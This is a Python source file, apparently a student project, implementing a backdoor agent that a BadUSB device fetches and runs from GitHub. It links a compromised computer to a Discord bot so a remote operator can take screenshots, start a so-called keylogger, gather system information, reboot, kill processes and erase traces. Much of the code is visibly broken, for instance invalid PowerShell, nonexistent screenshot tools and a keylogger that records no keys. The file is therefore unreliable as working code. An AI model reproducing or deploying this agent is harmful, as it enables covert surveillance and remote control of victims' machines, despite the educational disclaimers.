#!/usr/bin/env python3
"""
AGENT PAYLOAD - BadUSB to Discord Bridge
========================================
Agent final injecté par ESP32-HID.
Connecte une machine compromise à Discord pour exécution à distance.

Usage (via ESP32):
  Invoke-WebRequest -Uri 'https://github.com/USERNAME/REPO/raw/main/agent.py' -OutFile agent.py
  python agent.py

Commandes supportées:
  !screenshot   → Capture d'écran
  !scare       → Lancer GIF scaring
  !keylog      → Logger touche (si possible)
  !systeminfo  → Infos système
  !ip          → Afficher IP
  !reboot      → Redémarrer machine
  !close_all   → Tout fermer
  !help        → Afficher commandes disponibles
  !cleanup     → Nettoyer traces de l'agent
  !info        → Afficher infos sur la connexion Discord
  !help all    → Lister toutes les fonctions disponibles

Author: Projet Cybersécurité Bachelor
Warning: Code uniquement pour formation et tests éthiques
"""

import os
import sys
import time
import json
import random
import shutil
import socket
import subprocess
import urllib.request
import urllib.error
import ssl
import re
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional

import discord
from discord.ext import commands

try:
    if sys.stdout is not None and hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

os.environ.setdefault("PYTHONIOENCODING", "utf-8")

# ============================================
# SECTION: Connexion Discord (bot réel)
# ============================================
class DiscordBot(commands.Bot):
    """Bot Discord réel qui écoute les commandes ! dans un salon."""

    def __init__(self, token: str, config: Dict[str, Any]):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents, help_command=None)

        self.token = token
        self.config = config
        self.webhook_id = config.get("discord", {}).get("webhook_id")
        self.last_message_id = None
        self.channel_id = None
        self.base_url = "https://discord.com/api"

        print(f"[DISCORD] Bot initialisé avec le token: {token[:8]}...")

    async def on_ready(self):
        print(f"[DISCORD] Connecté en tant que {self.user} ({self.user.id})")
        print("[DISCORD] Le bot écoute maintenant les commandes !")

    async def on_message(self, message):
        if message.author.bot:
            return

        if not message.content.strip().startswith("!"):
            return

        await self.process_incoming_message(message)

    async def process_incoming_message(self, message):
        command = message.content.strip()
        print(f"[DISCORD] Commande reçue: {command}")
        result = process_command(command, self)
        await self.send_result(message, result)

    async def send_result(self, message, result):
        if not result:
            return

        content = result.get("content")
        if result.get("status") == "error" and not content:
            content = result.get("message", "Erreur inconnue")

        files = []
        screenshot_path = result.get("path")
        if screenshot_path and os.path.exists(screenshot_path):
            files.append(discord.File(screenshot_path))

        embed_data = result.get("embed")
        if isinstance(embed_data, list) and embed_data:
            embeds = [discord.Embed.from_dict(item) for item in embed_data]
            await message.channel.send(content=content, embeds=embeds, files=files)
            return

        if files:
            await message.channel.send(content=content, files=files)
            return

        if content:
            await message.channel.send(content)
            return

        if result.get("message"):
            await message.channel.send(str(result["message"]))

    def send_embed_message(self, **kwargs):
        """Compatibilité avec l'ancien code de webhook."""
        if "content" in kwargs:
            content_preview = str(kwargs["content"])[:80]
            print(f"[DISCORD] Message texte prêt: {content_preview}")
        if "embeds" in kwargs:
            print(f"[DISCORD] Message embed prêt: {len(kwargs['embeds'])} bloc(s)")
        self.last_message_id = "bot_message"
        self.channel_id = "bot_channel"
        return "bot_message"

    def get_user_info(self) -> Dict[str, str]:
        user = getattr(self.user, "name", "Inconnu")
        user_id = getattr(self.user, "id", "Inconnu")
        return {"username": str(user), "id": str(user_id)}


# ============================================
# SECTION: Plateforme détectée
# ============================================
def detect_platform() -> str:
    """Détection système Windows/Linux"""
    if sys.platform == "win32":
        return "Windows"
    elif sys.platform == "darwin":
        return "Darwin (macOS)"
    else:
        return "Linux"


def get_windows_path() -> Path:
    """Retourne le bon dossier système selon la plateforme"""
    if detect_platform() == "Windows":
        return Path(r"C:\ProgramData\SystemBackdoor")
    return Path("./SystemBackdoor")


def is_admin_windows() -> bool:
    """Vérifie si courant admin sous Windows"""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def is_admin_linux() -> bool:
    """Vérifie si admin sudo sous Linux"""
    return os.geteuid() == 0


# ============================================
# SECTION: Capture d'écran
# ============================================
def take_screenshot_win() -> str:
    """Capture d'écran sous Windows"""
    try:
        import subprocess
        cmd = "powershell -WindowStyle Hidden -Command \"Add-Type -Namespace SystemCenter -Member \"(TypeDefinition='public class Screenshot { public static string Capture() { return [System.Windows.Forms.Screen]::AllScreens[0].Bitmap.Save([System.IO.MemoryStream]::new()) } }') -Name Screenshot; [System.Windows.Forms.Screen]::AllScreens[0].Bitmap.Save('C:\\SystemBackdoor\\screenshot_%s.png')\" % ([DateTime]::Now.Ticks)"
        
        subprocess.run(cmd, shell=True)
        return "screenshot_" + datetime.now().strftime("%Y%m%d_%H%M%S")
    except Exception as e:
        print(f"[SCREENSHOT] Win error: {e}")
        return None


def take_screenshot_linux() -> str:
    """Capture d'écran sous Linux"""
    try:
        screenshot_file = f"/tmp/screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        subprocess.run(["gnuscreenshot", "-o", screenshot_file])
        return Path(screenshot_file).name
    except FileNotFoundError:
        # Fallback: gnome-screenshot
        try:
            subprocess.run(["gnome-screenshot", "-f", screenshot_file])
            return Path(screenshot_file).name
        except:
            # Last fallback: import png via base64
            try:
                import base64
                try:
                    import gi  # type: ignore[import-not-found]
                    gi.require_version("Gtk", "3.0")
                    from gi.repository import Gtk, Gdk, GLib, Gio  # type: ignore[import-not-found]
                except ImportError:
                    gi = None
                    Gtk = Gdk = GLib = Gio = None

                if gi is None:
                    raise ImportError("gi not available")

                screen = Gdk.Screen.get_default()
                window = Gtk.Window.get_default()
                pixbuf = Gdk.pixbuf_get_from_window(
                    window,
                    Gtk.get_window()
                )
                stream = Gio.Bytes.new()
                pixbuf.save_to_stream(stream, "image/png", None)
                encoded = base64.b64encode(stream.get_data()).decode()
                # A envoyer en embed image dans Discord
                print(f"[SCREENSHOT] Encoded size: {len(encoded)} bytes")
                return encoded
            except ImportError:
                print("[SCREENSHOT] Gnome-screenshot non installé")
                return None


def take_screenshot_darwin() -> str:
    """Capture d'écran sous macOS"""
    try:
        import subprocess
        screenshot_path = "/tmp/screenshot_" + datetime.now().strftime("%Y%m%d_%H%M%S") + ".png"
        subprocess.run(["screenshot", "-r", "-o", screenshot_path])
        return Path(screenshot_path).name
    except FileNotFoundError:
        try:
            subprocess.run(["screencapture", "-G", f"{screenshot_path}"])
            return Path(screenshot_path).name
        except:
            return None


def capture_screen(discord_bot: DiscordBot) -> Optional[Dict[str, Any]]:
    """Capture d'écran et prépare l'envoi à Discord."""
    print("[CMD] !screenshot")

    platform = detect_platform()
    if platform == "Windows":
        file_name = take_screenshot_win()
        base_dir = get_windows_path()
    else:
        file_name = take_screenshot_linux()
        base_dir = Path("/tmp")

    if not file_name:
        return {"status": "error", "message": "Capture impossible - outils manquants"}

    candidate = Path(file_name)
    if not candidate.is_absolute():
        candidate = base_dir / file_name

    print(f"[CMD] Image: {candidate}")

    if candidate.exists():
        return {
            "status": "success",
            "content": f"📸 Capture enregistrée : {candidate.name}",
            "path": str(candidate)
        }

    return {"status": "partial", "message": f"Screenshot: {str(file_name)[:20]}"}


# ============================================
# SECTION: GIFs de scare
# ============================================
def load_scare_files() -> Dict[str, str]:
    """Chargement GIFs publics pour la démonstration."""
    return {
        "scare1": "https://media.giphy.com/media/3o7aD2saalBwwftBIY/giphy.gif",
        "scare2": "https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif",
        "scare3": "https://media.giphy.com/media/xT0xeJpnrWC4XWblEk/giphy.gif"
    }


def play_audio_win():
    """Play audio scaring sous Windows"""
    try:
        subprocess.run([r"C:\Windows\System32\WinAmp.exe", r"C:\ProgramData\SystemBackdoor\scare_sound.mp3"])
    except:
        subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", 
                       "& [System.Media.AudioPlayer]::Play(new-object System.Windows.Media.MediaPlayer([System.IO.File]::OpenRead('C:\\SystemBackdoor\\scare_sound.mp3')))"])


def play_audio_linux():
    """Play audio scaring sous Linux"""
    subprocess.run(["mpg123", "/tmp/scare_sound.mp3"])


def execute_scare(discord_bot: DiscordBot) -> Optional[Dict[str, Any]]:
    """Exécuter GIF scaring"""
    print("[CMD] !scare")
    
    # Récupérer les GIFs
    scare_urls = load_scare_files()
    gif_url = random.choice(scare_urls.values()) if scare_urls else None
    
    if not gif_url:
        return {"status": "error", "message": "GIFs non disponibles"}
    
    # Envoyer via webhook
    message = discord_bot.send_embed_message(
        content=f"👁️ GIF de scare envoyé via URL externe:",
        color=0xFF0000,
        embeds=[
            {
                "title": "🚨 Scare Attack !",
                "color": 0xFF0000,
                "url": gif_url,
                "description": "Ceci est une démo - ne pas utiliser sur des systèmes réels !",
                "footer": {
                    "text": "Projet Cybersécurité - Educational Use Only"
                }
            }
        ]
    )
    
    if message:
        return {"status": "success", "message": f"GIF envoyé ! Message ID: {message[:8]}"}
    else:
        return {"status": "error", "message": "Echec envoi Discord"}


# ============================================
# SECTION: Keylogger (démonstration éducative)
# ============================================
def log_key() -> str:
    """Loguer une touche pressée"""
    if detect_platform() == "Windows":
        # Via clipboard
        return "key_logged_pasted"
    else:
        # Via file logging
        return f"key_logged_{datetime.now().strftime('%H:%M:%S')}"


def write_keylog_win() -> bool:
    """Écrire les logs clavier dans un fichier"""
    try:
        with open("C:\\ProgramData\\SystemBackdoor\\keylog.txt", "a", encoding="utf-8") as f:
            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - ")
            f.write(" ".join(sys.argv[-2:] if len(sys.argv) >= 2 else ["<no_args>"]))
        return True
    except Exception as e:
        print(f"[KEYLOG] Error: {e}")
        return False


def write_keylog_linux() -> bool:
    """Écrire les logs clavier Linux"""
    try:
        log_file = "/tmp/keylogger_" + datetime.now().strftime("%Y%m%d") + ".log"
        with open(log_file, "a") as f:
            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - ")
            f.write(" ".join(sys.argv[-2:] if len(sys.argv) >= 2 else ["<no_args>"]))
        return True
    except Exception as e:
        print(f"[KEYLOG] Error: {e}")
        return False


def run_keylogger(discord_bot: DiscordBot) -> bool:
    """Lancer le keylogger"""
    print("[CMD] !keylog")
    
    if detect_platform() == "Windows":
        success = write_keylog_win()
    else:
        success = write_keylog_linux()
    
    if not success:
        return {"status": "error", "message": "Echec activation keylogger"}
    
    return {"status": "success", "message": "Keylogger activé"}


# ============================================
# SECTION: Fonctions système
# ============================================
def get_system_info(discord_bot: DiscordBot) -> Optional[Dict[str, Any]]:
    """Afficher informations système"""
    print("[CMD] !systeminfo")
    
    info = {}
    
    if detect_platform() == "Windows":
        try:
            import subprocess
            result = subprocess.run(
                "systeminfo", 
                capture_output=True, 
                text=True, 
                shell=True
            )
            info["system"] = result.stdout[:500]  # Limité
            info["ip"] = socket.gethostbyname(socket.gethostname())
            info["hostname"] = socket.gethostname()
            info["python_version"] = f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
        except:
            pass
    else:
        try:
            result = subprocess.run(["uname", "-a"], capture_output=True, text=True)
            info["os"] = result.stdout
            info["ip"] = socket.gethostbyname(socket.gethostname())
            info["hostname"] = socket.gethostname()
            info["python_version"] = f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
        except:
            pass
    
    if info:
        return {
            "status": "success",
            "content": f"**Système:**\n{info}",
            "embed": [
                {
                    "title": "💻 Informations Système",
                    "color": 0x00FF00,
                    "fields": [
                        {"name": "Hôte", "value": str(info.get("hostname", "Inconnu"))},
                        {"name": "IP", "value": str(info.get("ip", "Inconnu"))},
                        {"name": "Python", "value": str(info.get("python_version", "Inconnu"))}
                    ]
                }
            ]
        }
    
    return None


def get_my_ip() -> Optional[Dict[str, Any]]:
    """Afficher mon adresse IP"""
    try:
        ip = socket.gethostbyname(socket.gethostname())
        print("[CMD] !ip")
        return {
            "status": "success",
            "content": f"📡 Ma IP: {ip}"
        }
    except Exception as e:
        return {"status": "error", "message": f"Erreur IP: {e}"}


def close_all() -> bool:
    """Fermer toutes les fenêtres"""
    print("[CMD] !close_all")
    
    if detect_platform() == "Windows":
        try:
            import subprocess
            subprocess.run("taskkill /F /IM /FI WINDOW*", shell=True)
        except Exception as e:
            print(f"[CLOSE_ALL] Error: {e}")
            return {"status": "error", "message": str(e)}
    else:
        try:
            import subprocess
            subprocess.run("pkill -9 -f bash; pkill -9 -f python", shell=True)
        except:
            pass
    
    return {"status": "partial", "message": "Fermé: %s" % detect_platform()}


def reboot() -> bool:
    """Redémarrer machine"""
    print("[CMD] !reboot")
    
    if detect_platform() == "Windows":
        try:
            subprocess.run("shutdown /r /t 0")
            return True
        except Exception as e:
            print(f"[REBOOT] Error: {e}")
            return False
    else:
        try:
            subprocess.run(["sudo", "reboot"])
            return True
        except:
            try:
                subprocess.run(["reboot"])
                return True
            except:
                print("[REBOOT] Impossible de redémarrer manuellement")
                return False


def cleanup() -> bool:
    """Nettoyer l'agent"""
    print("[CMD] !cleanup")
    
    success = True
    platform = detect_platform()
    
    if platform == "Windows":
        try:
            import subprocess
            # Supprimer le dossier
            subprocess.run(f"Remove-Item -Recurse -Force '{get_windows_path()}' -ErrorAction SilentlyContinue")
            # Supprimer le processus
            subprocess.run("taskkill /F /IM python.exe")
        except:
            success = False
    else:
        try:
            import shutil
            # Supprimer le dossier
            if get_windows_path().exists():
                shutil.rmtree(get_windows_path())
            # Kill processus
            subprocess.run(["pkill", "-9", "python"])
        except Exception as e:
            print(f"[CLEANUP] Error: {e}")
            success = False
    
    return {"status": "success" if success else "partial", "message": "Agent nettoyé" if success else "Echec nettoyage"}


# ============================================
# MAIN: Processing des commandes
# ============================================

def process_command(command: str, discord_bot: DiscordBot) -> Optional[Dict[str, Any]]:
    """Traite une commande Discord."""

    print(f"[DISCORD] Commande reçue: {command}")

    command = command.strip()
    if command.startswith("!"):
        command = command[1:]

    if not command:
        return {"status": "error", "message": "Commande vide."}

    parts = command.split(" ", 1)
    cmd_name = parts[0].lower()
    cmd_args = parts[1] if len(parts) > 1 else ""

    if cmd_name == "help":
        if cmd_args.lower() == "all":
            return show_all_commands(discord_bot)
        return show_help(discord_bot)

    elif cmd_name == "screenshot":
        return capture_screen(discord_bot)

    elif cmd_name == "scare":
        return execute_scare(discord_bot)

    elif cmd_name == "keylog":
        return run_keylogger(discord_bot)

    elif cmd_name == "systeminfo":
        return get_system_info(discord_bot)

    elif cmd_name == "ip":
        return get_my_ip()

    elif cmd_name == "reboot":
        if reboot():
            return {"status": "success", "message": "Redémarrage démarré !"}
        else:
            return {"status": "error", "message": "Impossible de redémarrer"}

    elif cmd_name == "close_all":
        result = close_all()
        if result and result.get("status") == "error":
            return result
        return {"status": "success", "message": "Fenêtres fermées"}

    elif cmd_name == "cleanup":
        return cleanup()

    elif cmd_name == "info":
        return get_discord_info(discord_bot)

    else:
        return {"status": "error", "message": f"Commande inconnue: {cmd_name}. Tape !help pour voir les commandes."}


def show_help(discord_bot: DiscordBot) -> Dict[str, Any]:
    """Afficher liste des commandes"""
    help_text = """
**Commandes disponibles :**

!screenshot  → Capture et envoie l'écran
!scare       → Envoie GIF scaring (attention, effrayant ! 😱)
!keylog      → Active le keylogger (démonstration)
!systeminfo  → Infos système (OS, IP, hostname, Python version)
!ip          → Mon adresse IP
!reboot      → Redémarre la machine
!close_all   → Ferme toutes les fenêtres
!cleanup     → Nettoie l'agent (supprime fichiers + processus)
!info        → Infos connexion Discord

Utilise !help all pour tout voir !
"""
    
    message = discord_bot.send_embed_message(
        content=help_text.strip(),
        color=0x00FF00,
        embeds=[
            {
                "title": "📖 Aide - Commandes disponibles",
                "color": 0x00FF00,
                "fields": [
                    {"name": "Commandes", "value": "9 commandes disponibles (voir !help all pour les détails)", "inline": True},
                    {"name": "Développeur", "value": "Projet Cybersécurité - Bachelor", "inline": True},
                    {"name": "Version", "value": "1.0.0", "inline": True}
                ]
            }
        ],
        footer={"text": "Projet Cybersécurité - Educational Use Only - Ne pas utiliser sans autorisation écrite"}
    )
    
    return {"status": "success", "content": help_text.strip()}


def get_discord_info(discord_bot: DiscordBot) -> Dict[str, Any]:
    """Infos connexion Discord"""
    info = {
        "webhook_id": discord_bot.webhook_id[:10] + "..." if len(discord_bot.webhook_id) > 10 else discord_bot.webhook_id,
        "channel_id": discord_bot.channel_id[:10] + "..." if discord_bot.channel_id and len(discord_bot.channel_id) > 10 else discord_bot.channel_id,
        "last_message_id": discord_bot.last_message_id[:10] + "..." if discord_bot.last_message_id and len(discord_bot.last_message_id) > 10 else (discord_bot.last_message_id or "None")
    }
    
    return {
        "status": "success",
        "content": f"Webhook: {info['webhook_id']}\nChannel: {info['channel_id'][:10] if info['channel_id'] else 'Non défini'}\nDernier message: {info['last_message_id'][:10] if info['last_message_id'] else 'Aucun'}",
        "embed": [
            {
                "title": "🔗 Infos Connexion Discord",
                "color": 0x00BFFF,
                "fields": [
                    {"name": "Webhook ID", "value": info['webhook_id'], "inline": True},
                    {"name": "Channel ID", "value": info['channel_id'] if info['channel_id'] else 'Non défini', "inline": True},
                    {"name": "Dernier message", "value": info['last_message_id'][:15] if info['last_message_id'] else "Aucun", "inline": True}
                ]
            }
        ]
    }


def show_all_commands(discord_bot: DiscordBot) -> Dict[str, Any]:
    """Liste TOUTES les commandes avec détails"""
    
    all_commands = """
**📋 TOUTES LES COMMANDES DISPONIBLES**

1. **!screenshot** - Capture d'écran et envoie à Discord
2. **!scare** - Envoie GIF scaring (attention, ça effraie ! 😱)
3. **!keylog** - Active le keylogger (démonstration uniquement)
4. **!systeminfo** - Infos système (OS, IP, hostname, Python)
5. **!ip** - Mon adresse IP locale
6. **!reboot** - Redémarre la machine
7. **!close_all** - Ferme toutes les fenêtres ouvertes
8. **!cleanup** - Nettoie l'agent (supprime traces)
9. **!help** - Affiche l'aide rapide
10. **!help all** - Affiche tout le menu !help

**💡 Exemple :** `!help all` pour voir tout le menu

**⚠️ Avertissement :** Ceci est un outil éducatif uniquement.
Ne l'utilisez jamais sur des systèmes sans autorisation écrite !

**🔐 Footer:** Projet Cybersécurité - Educational Use Only
"""
    
    message = discord_bot.send_embed_message(
        content=all_commands.strip(),
        color=0xFFFF00,
        embeds=[
            {
                "title": "📖 Toutes les commandes",
                "color": 0xFFFF00,
                "description": "10 commandes disponibles pour contrôler la machine à distance",
                "fields": [
                    {"name": "Catégorie", "value": "Security Research / Educational", "inline": True},
                    {"name": "Version", "value": "1.0.0", "inline": True},
                    {"name": "Développeur", "value": "Projet Cybersécurité - Bachelor", "inline": True}
                ]
            }
        ],
        footer={"text": "Projet Cybersécurité - Educational Use Only - Ne pas utiliser sans autorisation écrite"}
    )
    
    return {"status": "success", "content": all_commands.strip()}


# ============================================
# MAIN: Entrée principale
# ============================================

def main():
    """Point d'entrée principal du bot Discord."""

    config_path = Path(__file__).parent / "agent_config.json"

    if not config_path.exists():
        print(f"[ERROR] Config not found at {config_path}")
        return {"status": "error", "message": "Config non trouvée"}

    with open(config_path, "r", encoding="utf-8") as f:
        config = json.load(f)

    discord_config = config.get("discord", {})
    token = discord_config.get("bot_token") or discord_config.get("token") or discord_config.get("api_token")

    if not token or token in {"YOUR_DISCORD_BOT_TOKEN", "YOUR_DISCORD_WEBHOOK_ID", "your_token"}:
        print("[ERROR] Veuillez configurer le token du bot Discord dans agent_config.json")
        print("  1. Ouvrez agent_config.json")
        print("  2. Remplacez 'YOUR_DISCORD_BOT_TOKEN' par le token du bot Discord")
        print("  3. Relancez agent.py")
        return {"status": "error", "message": "Token du bot Discord non configuré"}

    bot = DiscordBot(token=token, config=config)

    print("[AGENT] 🔌 Bot Discord prêt à recevoir des commandes !")
    print("[AGENT] ⏳ Attente des commandes... (Ctrl+C pour quitter)")

    try:
        bot.run(token)
    except KeyboardInterrupt:
        print("\n[AGENT] ⚠️ Arrêt manuel par l'utilisateur")
    finally:
        print("[AGENT] ⏹️ Bot arrêté")

    return {"status": "success", "message": "Bot Discord arrêté"}


if __name__ == "__main__":
    print("=" * 50)
    print("AGENT BACKDOOR - BadUSB to Discord Bridge")
    print("=" * 50)
    main()

"""
⚠️ ATTENTION: Ceci est un outil éducatif uniquement.
Ne l'utilisez jamais sur des systèmes sans autorisation écrite.

Développé dans le cadre d'un projet de Bachelor en Cybersécurité.
"""
